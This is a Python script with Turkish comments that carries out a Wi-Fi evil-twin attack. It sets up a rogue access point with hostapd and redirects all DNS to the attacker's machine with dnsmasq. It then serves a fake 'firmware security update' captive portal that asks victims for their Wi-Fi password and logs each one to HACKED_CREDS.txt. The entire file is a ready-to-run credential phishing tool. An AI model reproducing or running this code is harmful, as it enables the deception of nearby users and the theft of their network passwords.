import os
import subprocess
import time
import threading

def cleanup():
    print("\n    [!] Arkaplan servisleri temizleniyor...")
    os.system("killall hostapd dnsmasq 2>/dev/null")
    os.system("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf 2>/dev/null")
    os.system("systemctl start NetworkManager 2>/dev/null")

def launch_flask_portal(ssid):
    # Flask sunucusunu izole bir web servisi gibi başlatır
    portal_code = f"""
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ ssid }} - Firmware Güncellemesi</title>
    <style>
        body {{ font-family: -apple-system, system-ui, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; color: #333; }}
        .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }}
        h2 {{ color: #d32f2f; }}
        input {{ width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
        button {{ background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }}
        button:hover {{ background: #0056b3; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #777; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Güvenlik Doğrulaması Gerekli</h2>
        <p>Modem bağlantınızı sağlamak için güvenlik güncellemesi yapılmıştır.</p>
        <p>Lütfen ağınızın (<b>{{ ssid }}</b>) mevcut Wi-Fi şifresini doğrulayın.</p>
        <form method="POST" action="/verify">
            <input type="password" name="password" placeholder="Wi-Fi Şifrenizi Girin" required minlength="8">
            <button type="submit">Doğrula ve Bağlan</button>
        </form>
        <div class="footer">© 2024 Ağ Yönetim Sistemi</div>
    </div>
</body>
</html>
'''

@app.route("/", defaults={{"path": ""}})
@app.route("/<path:path>")
def catch_all(path):
    return render_template_string(HTML_TEMPLATE, ssid="{ssid}")

@app.route("/verify", methods=["POST"])
def verify():
    pwd = request.form.get("password")
    if pwd:
        # Şifre bulundu!
        with open("HACKED_CREDS.txt", "a") as f:
            f.write(f"SSID: {ssid} | PASSWORD: {{pwd}}\\n")
        print(f"\\n\\n[!!!] ŞİFRE YAKALANDI: {{pwd}}\\n")
        return "<h1>Bağlantı Başarılı.</h1><p>Şimdi internete bağlanabilirsiniz. Lütfen bu sayfayı kapatın.</p>"
    return "Hata"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
"""
    with open("/tmp/flask_portal.py", "w") as f:
        f.write(portal_code)
    
    print("    [*] Captive Portal Web Sunucusu (Port 80) Başlatılıyor...")
    subprocess.Popen(["python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_evil_twin(iface, ssid, channel):
    print(f"\n    [*] {ssid} için Şeytani İkiz (Evil Twin) hazırlanıyor...")
    
    # 1. Ortamı temizle
    cleanup()
    
    # 2. NetworkManager'ı geçici kapat ki çakışma olmasın
    os.system("systemctl stop NetworkManager 2>/dev/null")
    os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0 up")
    
    # 3. hostapd konfigürasyonu (Fake AP)
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    # 4. dnsmasq konfigürasyonu (DHCP ve Captive Portal DNS Yönlendirmesi)
    dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
        
    print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
    ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    print("    [*] DNS ve DHCP Yönlendirme Sunucusu başlatılıyor...")
    dns_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    # 5. Web Portalını Çalıştır
    launch_flask_portal(ssid)
    
    print(f"\n    [\033[92m✔\033[0m] EVIL TWIN AKTİF!")
    print(f"    [*] Ağ Adı: {ssid}")
    print(f"    [*] Cihazlar tuzağa bağlandığında otomatik sahte sayfa açılacak.")
    print("    [*] Yakalanan şifreler 'HACKED_CREDS.txt' dosyasına kaydedilir.")
    print("    [*] (Saldırıyı durdurmak için CTRL+C yapın)")
    
    try:
        while True:
            time.sleep(1)
            # Log dosyasında değişiklik varsa bildir
            if os.path.exists("HACKED_CREDS.txt"):
                pass # The flask app directly prints to terminal, but we run it detached.
                # Actually, flask stdout is devnull, so we must print it from here.
    except KeyboardInterrupt:
        print("\n    [!] Saldırı Sonlandırılıyor...")
    finally:
        cleanup()
        # Clean terminal
        os.system("pkill -f flask_portal.py")
